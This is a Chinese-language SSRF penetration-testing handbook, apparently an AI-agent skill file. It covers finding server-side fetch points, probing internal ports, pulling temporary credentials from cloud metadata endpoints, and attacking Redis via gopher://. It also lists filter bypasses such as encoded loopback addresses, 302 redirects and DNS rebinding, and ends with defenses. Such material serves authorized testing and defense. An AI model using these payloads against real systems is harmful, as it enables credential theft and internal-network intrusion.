---
source: test008008008008-glitch/web-security-skills
skill: 03-ssrf
fused: 2026-09-17
method: 五步猎洞法
---

---
name: ssrf
description: SSRF 服务端请求伪造实战手册。当服务端替用户发起请求（URL 参数、导入、webhook、渲染、预览）时使用，覆盖内网探测、云元数据、协议利用与过滤绕过。
---

# 第三技 · SSRF —— 借服务器的手，摸服务器的家

> 猎手视角：SSRF 的价值不在"让服务器访问一个 URL"，而在于你终于拿到了一个**站在内网里的请求代理**——防火墙之后的端口、无需认证的云元数据、只对内开放的脆弱服务，都从这里开始。

**目标读者**：具备基础 Web 测试经验的安全工程师
**前置要求**：HTTP 协议、常见云平台元数据概念、能自建收数环境（DNSLog/Burp Collaborator）

---

## 何时启用本技

- 参数里**长得像 URL** 的字段：`?url=`、`?image=`、`?callback=`、`?next=`
- 功能语义上的"替你取一次"：URL 预览/截图、网页转 PDF、RSS/网页导入、远程图片转存
- Webhook 配置、头像自定义 URL、附件远程拉取
- 文档类：Excel/CSV 导入里带 `=IMAGE()`、`=WEBSERVICE()` 公式（表格软件的"SSRF"）

---

## 一、原理拆解

```
攻击者          Web服务器              内网资源
   │  url=http://10.0.0.5:8080  │
   ├───────────────────────────→│
   │                            ├────→ 10.0.0.5:8080（内网，攻击者本不可达）
   │        响应回显/盲信号      │←────
```

两类输出形态决定打法：

- **回显型**：响应里能看到目标返回内容（预览、转存场景）——直接读
- **盲型**：看不到内容——靠请求到达信号（DNSLog 收到解析、延迟差异、端口开关导致的状态差异）推断

---

## 二、五步猎洞法

### 第一步：识面 —— 收集一切"服务端替你请求"的入口

从功能清单反推：凡是"你给地址、它去拿"的都登记。重点翻 API 文档里的 `url`、`endpoint`、`callback` 字段。

### 第二步：定点 —— 确认请求确实从服务端发出

先把 URL 指向**自己的收数地址**（Burp Collaborator / 自建 DNSLog）：

```
?url=https://xxxx.collaborator.net/probe
```

收到回连 = 请求由服务端发出（对比：若只是前端 JS 去请求，那是 CSRF/CORS 的问题，不是 SSRF）。DNS 记录与 HTTP 记录分别看，有些环境只允许 DNS 出网——这本身就是重要情报。

### 第三步：验证 —— 内网可达性测绘

```text
?url=http://127.0.0.1:80        → 本机 Web 服务
?url=http://127.0.0.1:6379      → 本机 Redis（响应特征 "ERR wrong number of arguments"）
?url=http://169.254.169.254/    → 云元数据（见下）
?url=dict://127.0.0.1:6379/INFO → 协议级探测
```

端口开放信号（盲型）：连接拒绝 vs 超时的响应时间差、报错文本差异、返回码差异。用这个差异写脚本批量摸内网 C 段。

### 第四步：利用 —— 云元数据是头号目标

| 云 | 元数据地址 | 高价值端点 |
|----|-----------|-----------|
| AWS（IMDSv1） | `http://169.254.169.254/latest/meta-data/` | `iam/security-credentials/<角色名>` → 临时 AK/SK |
| AWS（IMDSv2） | 同上，需先 PUT 拿 token | `X-aws-ec2-metadata-token` 头 |
| GCP | `http://metadata.google.internal/` | `computeMetadata/v1/` 需 `Metadata-Flavor: Google` 头 |
| 阿里云 | `http://100.100.100.200/latest/meta-data/` | RAM 角色临时凭据 |
| Azure | `http://169.254.169.254/metadata/instance` | 需 `Metadata: true` 头 |

拿到临时凭据后就是云凭证利用的事了（超出本技，转云安全技）。

**内网服务直击**：Redis 未授权（写计划任务/写 SSH key）、内网 Kubelet API（`/pods`）、Elasticsearch、Consul——SSRF 是钥匙，内网脆弱服务是门。

### 第五步：收官 —— 证明影响即停

报告写清：SSRF 位置 → 内网可达范围 → 元数据/内网服务拿到的具体证据（脱敏）。临时凭据**只验证有效性，不做横向**。

---

## 三、实战推演（虚构场景）

> 场景：授权测试虚构 SaaS `app.demo-example.com`，个人资料页支持"头像 URL"

1. **识面**：`avatar_url` 参数，服务端拉取后转存为用户头像
2. **定点**：设为 `https://abc.collaborator.net/p`，收数平台收到来自目标机房 IP 的 GET——SSRF 确认
3. **验证**：`avatar_url=http://127.0.0.1:8500/` 返回 200 带 Consul UI 特征——内网服务暴露；改探 `10.0.1.0/24` 用响应时间差异摸出 3 个存活 Web
4. **利用**：目标在阿里云，`avatar_url=http://100.100.100.200/latest/meta-data/ram/security-credentials/` 列出角色名，继续取临时凭据（回显在"头像下载失败"报错文本里）
5. **收官**：凭据仅做 STS `GetCallerIdentity` 验证即停，全程截图入报告

---

## 四、对抗与绕过

| 过滤方式 | 绕过思路 |
|----------|----------|
| 黑名单 `127.0.0.1`/`localhost` | `127.1`、`0x7f000001`、`2130706433`（十进制）、`[::]` |
| 黑名单 `169.254.169.254` 字符串 | `http://169.254.169.254.a.com/`（自建 DNS 解析）、`metadata.google.internal` 别名 |
| 重定向校验（只查首跳） | 首跳指向自建 HTTPS 302 → 跳转至内网地址 |
| 协议只许 http/https | 尝试 `gopher://`（可构造任意 TCP 报文，打 Redis/SMTP 神器）、`file://`、`dict://` |
| DNS 解析后校验 IP（解析两次） | **DNS Rebinding**：TTL=0，第一次解析过审，第二次解析到内网——多数自研校验防不住 |
| 直接封死出网 | 评估"共享云元数据地址仍可达吗"，有时元数据走链路层不经过出网策略 |

---

## 五、防御视角

1. **白名单是唯一正解**：目标域走 allowlist，而不是黑名单封内网 IP 段（永远封不完）
2. 解析后校验 IP + **禁止重定向**（或每次重定向重新校验）
3. 云侧：启用 IMDSv2（强制 token）、最小化实例角色权限
4. 出网走代理并限制目的网段，元数据地址在代理层封禁
5. 功能层面反问：这个"替用户取 URL"的需求真实存在吗？很多 SSRF 源于产品经理的随手一加

---

## 六、踩坑记录

- 费半天劲打内网端口，最后发现是**回显被 CDN 缓存**——测试 SSRF 一律加随机参数破缓存
- `gopher://` 打 Redis：报文里的 CRLF 一个都不能错，建议用 gopher 生成工具构造再 URL 编码
- 有的环境收数平台收到的是 **DNS 解析而非 HTTP**——说明出网被限制只放行 DNS，此时元数据、内网 `80/443` 也许仍通，别急着下"无危害"结论
- 重定向一跳、二跳都可能被二次利用，防御侧只查首跳是常见漏洞；测试侧则要记得这也是绕过点
- 拿到云凭据后容易上头去翻 Bucket——**授权范围先看清楚**，越界一步性质就变了

---

## 七、速查卡

```text
确认:   url=收数地址 看回连来源IP
探测:   127.0.0.1:端口 | 时间差盲探C段
元数据: AWS 169.254.169.254 | 阿里 100.100.100.200 | GCP metadata.google.internal
绕过:   0x7f000001 | 302中转 | DNS rebinding | gopher://
高价值: iam/security-credentials/ → 临时AK/SK | 内网Redis/Kubelet
```
